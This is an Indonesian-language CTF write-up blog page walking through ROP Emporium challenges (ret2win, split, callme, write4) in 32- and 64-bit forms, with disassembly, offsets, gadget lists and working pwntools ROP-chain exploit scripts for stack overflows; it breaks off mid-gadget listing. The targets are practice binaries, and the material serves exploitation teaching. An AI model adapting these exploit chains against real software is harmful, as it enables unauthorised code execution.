<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ROP Emporium | ~/.ahm4ddm</title><meta name=keywords content="writeups,linux,practice"><meta name=description content="Writeup ROP Emporium x86 dan x86_64(Indonesia)"><meta name=author content><link rel=canonical href=https://ahm4ddm.xyz/posts/ctf/writeup-ropemporium/><meta name=google-site-verification content="G-4C7QBNGT6Y"><link crossorigin=anonymous href=/assets/css/stylesheet.d7beabeee0da75dbbdcfc9fa977db7297976285cdd304081c6970c28a0c46d12.css integrity="sha256-176r7uDaddu9z8n6l323KXl2KFzdMECBxpcMKKDEbRI=" rel="preload stylesheet" as=style><link rel=icon href=https://ahm4ddm.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ahm4ddm.xyz/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://ahm4ddm.xyz/favicon.ico><link rel=apple-touch-icon href=https://ahm4ddm.xyz/apple-touch-icon.png><link rel=mask-icon href=https://ahm4ddm.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','G-4C7QBNGT6Y','auto');ga('send','pageview');}</script><meta property="og:title" content="ROP Emporium"><meta property="og:description" content="Writeup ROP Emporium x86 dan x86_64(Indonesia)"><meta property="og:type" content="article"><meta property="og:url" content="https://ahm4ddm.xyz/posts/ctf/writeup-ropemporium/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-10T22:29:10+07:00"><meta property="article:modified_time" content="2021-02-10T22:29:10+07:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="ROP Emporium"><meta name=twitter:description content="Writeup ROP Emporium x86 dan x86_64(Indonesia)"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://ahm4ddm.xyz/posts/"},{"@type":"ListItem","position":3,"name":"ROP Emporium","item":"https://ahm4ddm.xyz/posts/ctf/writeup-ropemporium/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ROP Emporium","name":"ROP Emporium","description":"Writeup ROP Emporium x86 dan x86_64(Indonesia)","keywords":["writeups","linux","practice"],"articleBody":"Daftar Isi ret2win\nsplit\ncallme\nwrite4\nret2win    File Download     ret2win32 klik   ret2win64 klik    ret2win32 kita cek terlebih dahulu filenya.\nDidapatkan file ELF, dan dynamically linked\n1 2  $file ret2win32 ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped   lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop)\n1 2 3 4 5 6  $checksec ret2win32 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)   kita cek dengan gdb, saya mencoba dengan menampilkan semua fungsi yang ada pada binary\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  gdb-peda$ info functions All defined functions: Non-debugging symbols: ... ... ... 0x08048510 __do_global_dtors_aux 0x08048540 frame_dummy 0x08048546 main 0x080485ad pwnme 0x0804862c ret2win 0x08048660 __libc_csu_init 0x080486c0 __libc_csu_fini 0x080486c4 _fini   kita coba disassembly fungsi main.\npada fungsi main binary memanggil fungsi yaitu pwnme\n1 2 3 4 5 6 7 8 9 10 11 12 13  gdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x08048583 :\tcall 0x80483d0  0x08048588 :\tadd esp,0x10 0x0804858b :\tcall 0x80485ad  ... ... ... End of assembler dump.   kita disassembly fungsi pwnme ternyata ada kerentanan fungsi read dimana tidak ada Null Byte pada saat input berakhir.\n1 2 3 4 5 6 7 8 9 10 11 12 13  gdb-peda$ pdisas pwnme Dump of assembler code for function pwnme: ... ... ... 0x0804860e :\tpush eax 0x0804860f :\tpush 0x0 0x08048611 :\tcall 0x80483b0  0x08048616 :\tadd esp,0x10 0x08048619 :\tsub esp,0xc ... ... ...   Tidak ada pemanggilan fungsi ret2win pada binary.\nkita cek disassembly fungsi ret2win ternyata ada pemanggilan system\n1 2 3 4 5 6 7 8 9 10  gdb-peda$ pdisas ret2win Dump of assembler code for function ret2win: ... ... ... 0x08048645 :\tpush 0x8048813 0x0804864a :\tcall 0x80483e0  ... ... ...   saya beranggapan bahwa itu memanggil system(cat flag.txt) dan ternyata benar\n1  0x8048813:\t\"/bin/cat flag.txt\"   Kita buat exploit code.\nPertama harus tau offset ke EIP.\ndidapatkan 44.\n1 2 3 4 5 6 7 8 9 10 11  Registers contain pattern buffer: ECX+52 found at offset: 69 EDX+52 found at offset: 69 EBP+0 found at offset: 40 EIP+0 found at offset: 44 Registers point to pattern buffer: [ESP] -- offset 48 - size ~8 Pattern buffer found at: 0xffffd0c0 : offset 0 - size 56 ($sp + -0x30 [-12 dwords]) References to pattern buffer found at: 0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords])   kita buat kode exploit\n1 2 3 4 5 6 7 8 9 10  from pwn import * p = ELF('./ret2win32') r = process('./ret2win32') ret2win = p.symbols['ret2win'] junk = b'X'*44 junk += p32(ret2win) log.info('ret2win 0x%x' %ret2win) r.sendline(junk) r.interactive()   1 2 3 4 5 6 7 8 9  $python3 solver.py ... ... ...  Thank you! Well done! Here's your flag: ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $   ret2win64 kita cek terlebih dahulu filenya.\nDidapatkan file ELF, dan dynamically linked\n1 2  $file ret2win ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped   lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop)\n1 2 3 4 5 6  $checksec ret2win Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)   Setelah dilakukan pengecekan pada gdb sama seperti binary 32 bit\nKita cari offset. didapatkan 40\nMungkin disini timbul pertanyaan, kenapa RIP tidak ter-overwrite? karena aplikasi yang berjalan pada arsitektur 64-bit hanya me-load canonical address ke dalam register RIP\nContoh: Ketika overflow sebuah buffer dengan pattern yang kita buat dan ingin melihat RIP tertimpa dengan alamat pattern seharusnya tidak bisa karena itu bukan canonical address. lebih lanjut kunjungi ini\n1 2 3 4 5 6 7 8 9 10  Registers contain pattern buffer: RBP+0 found at offset: 32 Registers point to pattern buffer: [RSP] -- offset 40 - size ~35 Pattern buffer found at: 0x00007fffffffdf30 : offset 0 - size 56 ($sp + -0x28 [-10 dwords]) References to pattern buffer found at: 0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords]) 0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords]) 0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])   Kita buat kode exploit\n1 2 3 4 5 6 7 8 9 10 11  from pwn import * p = ELF('./ret2win') r = process('./ret2win') ret2win = p.symbols['ret2win'] junk = b'X'*40 junk += p64(ret2win) log.info('ret2win 0x%x' %ret2win) r.sendline(junk) r.interactive()   1 2 3 4 5 6 7 8 9  $python3 sol.py ... ... ...  Thank you! Well done! Here's your flag: ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $   [created at: February 10, 2021]\nsplit    File Download     ret2split32 klik   ret2split64 klik    ret2split32 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n1 2  $file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped   lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n1 2 3 4 5 6  $checksec split32 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)   kita cek semua fungsi menggunakan gdb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  gdb-peda$ info functions All defined functions: Non-debugging symbols: ... ... ... 0x080484d0 register_tm_clones 0x08048510 __do_global_dtors_aux 0x08048540 frame_dummy 0x08048546 main 0x080485ad pwnme 0x0804860c usefulFunction 0x08048630 __libc_csu_init 0x08048690 __libc_csu_fini 0x08048694 _fini   kita lakukan disassembly fungsi main\n1 2 3 4 5 6 7 8 9 10 11  gdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x08048583 :\tcall 0x80483d0  0x08048588 :\tadd esp,0x10 0x0804858b :\tcall 0x80485ad  ... ... ...   Pada fungsi main hanya memanggil fungsi pwnme.\nkita disassembly fungsi pwnme\n1 2 3 4 5 6 7 8 9 10 11 12 13  gdb-peda$ pdisas pwnme Dump of assembler code for function pwnme: ... ... ... 0x080485ee :\tpush eax 0x080485ef :\tpush 0x0 0x080485f1 :\tcall 0x80483b0  0x080485f6 :\tadd esp,0x10 0x080485f9 :\tsub esp,0xc ... ... ...   Pada fungsi pwnme terdapat kerentanan read dimana tidak ada Null Byte pada saat input berakhir.\nTidak ada pemanggilan fungsi usefulFunction pada binary.\nkita cek disassembly fungsi usefulFunction ternyata ada pemanggilan system\n1 2 3 4 5 6 7 8 9 10 11 12 13  gdb-peda$ pdisas usefulFunction Dump of assembler code for function usefulFunction: 0x0804860c :\tpush ebp 0x0804860d :\tmov ebp,esp 0x0804860f :\tsub esp,0x8 0x08048612 :\tsub esp,0xc 0x08048615 :\tpush 0x804870e 0x0804861a :\tcall 0x80483e0  0x0804861f :\tadd esp,0x10 0x08048622 :\tnop 0x08048623 :\tleave 0x08048624 :\tret End of assembler dump.   Permasalahannya yaitu fungsi ini tidak memanggil system(cat flag.txt) melainkan memanggil system(/bin/ls)\nPada challenge ini kita masih bisa memanggil /bin/cat flag.txt\n1  Don't just take my word for it, let's check the call to system() and that useful string are actually here.   Ingat argumen dari fungsi yang dijalankan pada arsitektur 32-bit disimpan pada stack.\nsetelah kita memanggil fungsi system yang benar\nlalu kita panggil /bin/cat flag.txt\n1  system() returns after the command has been completed.   Kita cari dulu offset ke EIP\n1 2 3 4 5 6 7 8 9  Registers contain pattern buffer: ECX+52 found at offset: 69 EDX+52 found at offset: 69 EBP+0 found at offset: 40 EIP+0 found at offset: 44 Registers point to pattern buffer: [ESP] -- offset 48 - size ~114 Pattern buffer not found in memory Reference to pattern buffer not found in memory   didapatkan 44\nKita buat kode exploit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  from pwn import * p = ELF('./split32') r = process('./split32') sys = p.plt['system'] magic = next(p.search(b'/bin/cat flag.txt\\x00')) log.info('system 0x%x' %sys) log.info('magic 0x%x' %magic) junk = b'X'*44 payload = junk payload += p32(sys) payload += b'Y'*4 payload += p32(magic) r.sendline(payload) r.interactive()   1 2 3 4 5 6 7 8 9  $python3 sol.py split by ROP Emporium x86 Contriving a reason to ask user for data...  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $   ret2split64 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n1 2  $file split split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped   lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n1 2 3 4 5 6  $checksec split Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)   Setelah dilakukan pengecekan dengan gdb, semua fungsi sama.\nlangsung saja ke proses exploit.\nSebelum itu, ingat argumen dari fungsi yang dijalankan pada arsitektur 64-bit disimpan pada register RDI, RSI, RDX,RCX, R8, R9\nPertama kita cari offset terlebih dahulu\n1 2 3 4 5 6 7 8 9 10  Registers contain pattern buffer: RBP+0 found at offset: 32 Registers point to pattern buffer: [RSP] -- offset 40 - size ~56 Pattern buffer found at: 0x00007fffffffdf30 : offset 0 - size 96 ($sp + -0x28 [-10 dwords]) References to pattern buffer found at: 0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords]) 0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords]) 0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])   Didapatkan 40.\nKita buat kode exploit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  from pwn import * p = ELF('./split') r = process('./split') rop = ROP('./split') sys = p.plt['system'] magic = next(p.search(b'/bin/cat flag.txt')) popret = rop.find_gadget(['pop rdi', 'ret'])[0] log.info('system 0x%x' %sys) log.info('magic 0x%x' %magic) junk = b'X'*40 payload = junk payload += p64(popret) payload += p64(magic) payload += p64(sys) r.sendline(payload) r.interactive()   1 2 3 4 5 6  $python3 sol.py Contriving a reason to ask user for data...  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $   [Created at: February 11, 2021]\ncallme    File Download     callme32 klik   callme64 klik    callme32 kita cek terlebih dahulu filenya.\nDidapatkan file ELF, dan dynamically linked\n1 2  $file callme callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped   lalu kita cek proteksi pada file.\ndidapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n1 2 3 4 5 6 7  $checksec callme32 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) RUNPATH: b'.'   Kita cek menggunakan gdb untuk menampilkan semua fungsi.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  gdb-peda$ info function All defined functions: Non-debugging symbols: ... ... ... 0x08048650 __do_global_dtors_aux 0x08048680 frame_dummy 0x08048686 main 0x080486ed pwnme 0x0804874f usefulFunction 0x080487a0 __libc_csu_init 0x08048800 __libc_csu_fini 0x08048804 _fini   Kita coba lakukan disassembly fungsi main\n1 2 3 4 5 6 7 8 9 10  gdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x080486c8 :\tadd esp,0x10 0x080486cb :\tcall 0x80486ed  ... ... ...   Pada fungsi main memanggil pwnme\nKita lakukan disassembly fungsinya\n1 2 3 4 5 6 7 8 9 10 11 12 13  gdb-peda$ pdisas pwnme Dump of assembler code for function pwnme: ... ... ... 0x08048731 :\tpush eax 0x08048732 :\tpush 0x0 0x08048734 :\tcall 0x80484c0  0x08048739 :\tadd esp,0x10 0x0804873c :\tsub esp,0xc ... ... ...   Pada challenge ini, untuk mendapatkan flag kita harus memasukkan 3 argumen.\n1  You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag   Pada callme_one() kita isi dengan 3 argumen lalu kita panggil callme_two() lalu isi 3 argumen dst.\nKita cari gadget pop tiga kali.\n1 2 3 4 5 6 7 8 9 10 11  Gadgets information ============================================================ 0x080487fb : pop ebp ; ret 0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080484ad : pop ebx ; ret 0x080487fa : pop edi ; pop ebp ; ret 0x080487f9 : pop esi ; pop edi ; pop ebp ; ret 0x08048496 : ret 0x0804861e : ret 0xeac1 Unique gadgets found: 7   Kita pakai 0x080487f9.\nSelanjutnya kita cari offset ke EIP\n1 2 3 4 5 6 7 8 9 10 11 12  Registers contain pattern buffer: ECX+52 found at offset: 69 EDX+52 found at offset: 69 EBP+0 found at offset: 40 EIP+0 found at offset: 44 Registers point to pattern buffer: [ESP] -- offset 48 - size ~90 Pattern buffer found at: 0xf7fca6d9 : offset 33208 - size 4 (/media/ahm4d/Belajar/1 Kuliah/!github/binex/rop_emporium_all_challenges/callme32/libcallme32.so) 0xffffd0c0 : offset 0 - size 100 ($sp + -0x30 [-12 dwords]) References to pattern buffer found at: 0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords])   Offset 44.\nKita buat kode exploit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  from pwn import * p = ELF('./callme32') r = process('./callme32') call1 = p.plt['callme_one'] call2 = p.plt['callme_two'] call3 = p.plt['callme_three'] pop3 = 0x080487f9 log.info('call1 0x%x' %call1) log.info('call2 0x%x' %call2) log.info('call3 0x%x' %call3) junk = b'X'*44 payload = junk payload += p32(call1) payload += p32(pop3) payload += p32(0xdeadbeef) payload += p32(0xcafebabe) payload += p32(0xd00df00d) payload += p32(call2) payload += p32(pop3) payload += p32(0xdeadbeef) payload += p32(0xcafebabe) payload += p32(0xd00df00d) payload += p32(call3) payload += p32(pop3) payload += p32(0xdeadbeef) payload += p32(0xcafebabe) payload += p32(0xd00df00d) r.sendline(payload) r.interactive()   Jalankan maka didapatkan flag\n1 2 3 4 5 6 7  $python3 sol.py  Thank you! callme_one() called correctly callme_two() called correctly ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $   callme64 kita cek terlebih dahulu filenya.\nDidapatkan file ELF, dan dynamically linked\n1 2  $file callme callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped   lalu kita cek proteksi pada file.\ndidapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop)\n1 2 3 4 5 6 7  $checksec callme Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.'   Kita cek menggunakan gdb untuk menampilkan semua fungsi.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  gdb-peda$ info function All defined functions: Non-debugging symbols: ... ... ... 0x0000000000400840 frame_dummy 0x0000000000400847 main 0x0000000000400898 pwnme 0x00000000004008f2 usefulFunction 0x000000000040093c usefulGadgets 0x0000000000400940 __libc_csu_init 0x00000000004009b0 __libc_csu_fini 0x00000000004009b4 _fini   Setelah saya disassembly fungsi main dan pwnme sama seperti fungsi pada binary 32-bit.\nChallenge ini sama seperti binary 32-bit diatas. yaitu untuk menampilkan flag kita harus mengisi callme_one, callme_two, dan callme_three dengan menggunakan 3 argumen.\n1  For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)   Pada binary 64-bit ada fungsi menarik yaitu usefulGadgets dimana add 3 gadgets pop yang mana sangat berguna sekali untuk proses eksploit. daripada kita mencari secara manual.\nKita cari offset dahulu.\n1 2 3 4 5 6 7 8 9 10 11  Registers contain pattern buffer: RBP+0 found at offset: 32 Registers point to pattern buffer: [RSP] -- offset 40 - size ~62 Pattern buffer found at: 0x00007ffff7fc98bb : offset 33208 - size 4 (/media/ahm4d/Belajar/1 Kuliah/!github/binex/rop_emporium_all_challenges/callme/libcallme.so) 0x00007fffffffdf40 : offset 0 - size 100 ($sp + -0x28 [-10 dwords]) References to pattern buffer found at: 0x00007fffffffb350 : 0x00007fffffffdf40 ($sp + -0x2c18 [-2822 dwords]) 0x00007fffffffdb40 : 0x00007fffffffdf40 ($sp + -0x428 [-266 dwords]) 0x00007fffffffdb58 : 0x00007fffffffdf40 ($sp + -0x410 [-260 dwords])   Offset 40.\nKita buat kode exploit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  from pwn import * p = ELF('./callme') r = process('./callme') call1 = p.plt['callme_one'] call2 = p.plt['callme_two'] call3 = p.plt['callme_three'] pop3 = p.symbols['usefulGadgets'] junk = b'X'*40 payload = junk payload += p64(pop3) payload += p64(0xdeadbeefdeadbeef) payload += p64(0xcafebabecafebabe) payload += p64(0xd00df00dd00df00d) payload += p64(call1) payload += p64(pop3) payload += p64(0xdeadbeefdeadbeef) payload += p64(0xcafebabecafebabe) payload += p64(0xd00df00dd00df00d) payload += p64(call2) payload += p64(pop3) payload += p64(0xdeadbeefdeadbeef) payload += p64(0xcafebabecafebabe) payload += p64(0xd00df00dd00df00d) payload += p64(call3) r.sendline(payload) r.interactive()   Jalankan maka didapatkan flag\n1 2 3 4 5 6 7  $python3 sol.py  Thank you! callme_one() called correctly callme_two() called correctly ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $   [Created at: February 13, 2021]\nwrite4    File Download     write432 klik   write4 klik    write432 Kita cek terlebih filenya.\nDidapatkan file ELF, dan dynamically linked\n1 2  $file write432 write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped   Lalu kita cek proteksi pada file.\ndidapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n1 2 3 4 5 6 7  $checksec write432 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) RUNPATH: b'.'   Kita cek menggunakan gdb untuk menampilkan semua fungsi.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  gdb-peda$ info function All defined functions: Non-debugging symbols: ... ... ... 0x08048500 frame_dummy 0x08048506 main 0x0804852a usefulFunction 0x08048543 usefulGadgets 0x08048550 __libc_csu_init 0x080485b0 __libc_csu_fini 0x080485b4 _fini   Kita coba lakukan disassembly fungsi main\n1 2 3 4 5 6 7 8 9 10 11  gdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x08048513 :\tpush ecx 0x08048514 :\tsub esp,0x4 0x08048517 :\tcall 0x80483b0  ... ... ...   Pada fungsi main memanggil pwnme\nKita lakukan disassembly fungsinya\n1 2 3 4 5 6 7 8 9  gdb-peda$ pdisas 0x80483b0 Dump of assembler code from 0x80483b0 to 0x80483d0::\tDump of assembler code from 0x80483b0 to 0x80483d0: 0x080483b0 :\tjmp DWORD PTR ds:0x804a00c 0x080483b6 :\tpush 0x0 0x080483bb :\tjmp 0x80483a0 0x080483c0 :\tjmp DWORD PTR ds:0x804a010 0x080483c6 :\tpush 0x8 0x080483cb :\tjmp 0x80483a0 End of assembler dump.   Setelah saya analisa ada fungsi yang menurut saya menarik tapi tidak pernah terpanggil. nah menggunakan metode Return Oriented Programming (rop) sebagai solusi.\nPada fungsi usefulFunction kita gunakan untuk mencetak flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gdb-peda$ pdisas 0x0804852a Dump of assembler code from 0x804852a to 0x804854a::\tDump of assembler code from 0x804852a to 0x804854a: 0x0804852a :\tpush ebp 0x0804852b :\tmov ebp,esp 0x0804852d :\tsub esp,0x8 0x08048530 :\tsub esp,0xc 0x08048533 :\tpush 0x80485d0 0x08048538 :\tcall 0x80483d0  0x0804853d :\tadd esp,0x10 0x08048540 :\tnop 0x08048541 :\tleave 0x08048542 :\tret 0x08048543 :\tmov DWORD PTR [edi],ebp 0x08048545 :\tret 0x08048546 :\txchg ax,ax 0x08048548 :\txchg ax,ax End of assembler dump.   Permasalahannya yaitu tidak ada string ‘/bin/cat flag.txt’.\n1  On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string \"/bin/cat flag.txt\" is not present this time.   Pada fungsi usefulGadgets kita bisa menulis string ‘flag.txt’.\n1 2 3 4 5 6 7  gdb-peda$ pdisas 0x08048543 Dump of assembler code from 0x8048543 to 0x8048563::\tDump of assembler code from 0x8048543 to 0x8048563: 0x08048543 :\tmov DWORD PTR [edi],ebp 0x08048545 :\tret ... ... ...   namun yang jadi masalah yaitu apakah ada permissions write pada file ELF tersebut, karena kalau tidak ada permissions tersebut tidak bisa walaupun sudah kita buat string ‘flag.txt’. pada arsitektur 32-bit kita menulis nilai sebesar 4 byte.\n1 2 3 4 5 6 7 8 9 10 11 12  Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al ... ... ... [23] .got.plt PROGBITS 0804a000 001000 000018 04 WA 0 0 4 [24] .data PROGBITS 0804a018 001018 000008 00 WA 0 0 4 [25] .bss NOBITS 0804a020 001020 000004 00 WA 0 0 1 [26] .comment PROGBITS 00000000 001020 000029 01 MS 0 0 1 [27] .symtab SYMTAB 00000000 00104c 000440 10 28 47 4 [28] .strtab STRTAB 00000000 00148c 000211 00 0 0 1 [29] .shstrtab STRTAB 00000000 00169d 000105 00 0 0 1   ternyata .got.plt .data .bss permissions Write(W), jadi kita bisa mencetak flag.txt.\nkita cari pop 2 kali\n1 2 3 4 5 6 7 8 9 10 11  Gadgets information ============================================================ 0x080485ab : pop ebp ; ret 0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0804839d : pop ebx ; ret 0x080485aa : pop edi ; pop ebp ; ret 0x080485a9 : pop esi ; pop edi ; pop ebp ; ret 0x08048386 : ret 0x0804849e : ret 0xeac1 Unique gadgets found: 7   saya gunakan pop edi pop ebp ret karena pada fungsi usefulGadgets nilai register ebp akan dipindahkan ke register edi\n0x08048543 :\tmov DWORD PTR [edi],ebp\nKita buat kode exeploit\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  from pwn import * p = ELF('./write432') r = process('./write432') printFlag = p.plt['print_file'] gadgets = p.symbols['usefulGadgets'] pop_edi_ebp = 0x080485aa bss = 0x804a020 log.info('print_flag 0x%x' %printFlag) log.info('gadgets 0x%x' %gadgets) log.info('pop edi ebp ret 0x%x' %pop_edi_ebp) log.info('bss 0x%x' %bss) junk = b'X'*44 payload = junk payload += p32(pop_edi_ebp) payload += p32(bss) payload += b'flag' payload += p32(gadgets) payload += p32(pop_edi_ebp) payload += p32(bss + 0x4) payload += b'.txt' payload += p32(gadgets) payload += p32(printFlag) payload += b'Y'*4 payload += p32(bss) r.sendline(payload) r.interactive()   Jalankan maka didapatkan flag\n1 2 3 4 5 6  $python3 sol.py  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 12182) [*] Got EOF while reading in interactive $   write4 Kita cek terlebih filenya.\nDidapatkan file ELF, dan dynamically linked\n1 2  $file write4 write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped   Lalu kita cek proteksi pada file.\ndidapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n1 2 3 4 5 6 7  $checksec write4 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.'   Kita cek menggunakan gdb untuk menampilkan semua fungsi.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  gdb-peda$ info function All defined functions: Non-debugging symbols: ... ... ... 0x0000000000400600 frame_dummy 0x0000000000400607 main 0x0000000000400617 usefulFunction 0x0000000000400628 usefulGadgets 0x0000000000400630 __libc_csu_init 0x00000000004006a0 __libc_csu_fini 0x00000000004006a4 _fini   Hampir sama dengan binary 64 namun ada sedikit perbedaan pada fungsi usefulGadgets\n1 2 3 4 5 6  gdb-peda$ pdisas usefulGadgets Dump of assembler code for function usefulGadgets: 0x0000000000400628 :\tmov QWORD PTR [r14],r15 0x000000000040062b :\tret 0x000000000040062c :\tnop DWORD PTR [rax+0x0] End of assembler dump.   Kita cek permisssions pada file section\n1 2 3 4 5 6 7 8 9 10 11  Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [21] .got PROGBITS 0000000000600ff0 00000ff0 0000000000000010 0000000000000008 WA 0 0 8 [22] .got.plt PROGBITS 0000000000601000 00001000 0000000000000028 0000000000000008 WA 0 0 8 [23] .data PROGBITS 0000000000601028 00001028 0000000000000010 0000000000000000 WA 0 0 8 [24] .bss NOBITS 0000000000601038 00001038 0000000000000008 0000000000000000 WA 0 0 1   .got .got.plt .data .bss didapatkan permissions Write (W).\nkita cari pop r14 r15 dan pop rdi\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  Gadgets information ============================================================ 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret 